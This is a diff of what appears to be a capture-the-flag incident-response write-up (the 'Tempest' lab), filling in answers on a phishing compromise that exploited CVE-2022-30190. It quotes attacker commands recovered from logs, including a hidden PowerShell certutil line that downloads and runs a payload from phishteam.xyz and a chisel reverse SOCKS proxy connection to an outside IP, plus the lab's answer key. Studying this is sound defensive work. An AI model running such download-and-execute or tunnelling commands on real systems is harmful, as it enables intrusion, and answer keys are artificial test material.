@@ -43,6 +43,7 @@ Additionally, the tasks has some notes for us:
 Searching for file creation events (Event ID 11) and file stream creation events (Event ID 15) near the start of the logs, we can find the events where the malicious file was downloaded.
 
 **What is the name of the compromised user and machine?**
+
 *Format: username-machine name*
 > benimaru-TEMPEST
 
@@ -68,6 +69,7 @@ To find this, we filter for events with ParentProcessID matching the PID of the 
 
 
 **What is the CVE number of the exploit used by the attacker to achieve a remote code execution?**
+
 *Format: XXXX-XXXXX*
 > 2022-30190
 
@@ -98,6 +100,7 @@ The task also gives us a few tips:
 This is the path we found in the obfuscated string, we just had to replace $app with the full AppData path
 
 **The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?**
+
 *Format: Remove the double quotes from the log.*
 > C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
 
@@ -117,6 +120,7 @@ With this we can see the hashes associated with this file:
 <img width="1012" height="159" alt="image" src="https://github.com/user-attachments/assets/004b59ce-c021-4bf8-bf9e-6b128f3790ec" />
 
 **The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?**
+
 *Format: domain:port*
 > resolvecyber.xyz:80
 
@@ -155,6 +159,7 @@ The next 3 questions all have to do with what is shown in the last image
 > GET
 
 **Based on the user agent, what programming language was used by the attacker to compile the binary?**
+
 *Format: Answer in lowercase*
 > nim
 
@@ -181,19 +186,30 @@ Port 5985 is the default TCP port for Windows Remote Management (WinRM) over HTT
 **The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?**
 
 *Format: Remove the double quotes from the log.*
->
+> C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
+
+I was unsure of what to look for for this question, so I looked into reverse socks proxies. I eventually searched for "socks" and found the command line used to initate the connection, which used the ch.exe file that was downloaded from the `phishteam.xyz` domain earlier.
+
+<img width="983" height="135" alt="image" src="https://github.com/user-attachments/assets/391dfb70-268f-4208-8e8d-1272a9ff299e" />
 
 **What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?**
->
+> 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
+
+The SHA256 hash is in the same entry as we found the command from the last question.
 
 **What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.**
->
+> chisel
+
+Searching for the hash on VirusTotal shows a malicious file. The Names section gives us the information we are looking for:
+
+<img width="367" height="303" alt="image" src="https://github.com/user-attachments/assets/87769810-0843-47c4-ad13-08494b8a04c5" />
 
 **The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?**
 
 *Format: Answer in lowercase*
->
+> winrm
 
+This is the service associated with the port we found earlier that could provide a remote shell.
 
 ### Task 8: Privilege Escalation - Exploiting Privileges
 #### Task 8 Questions:
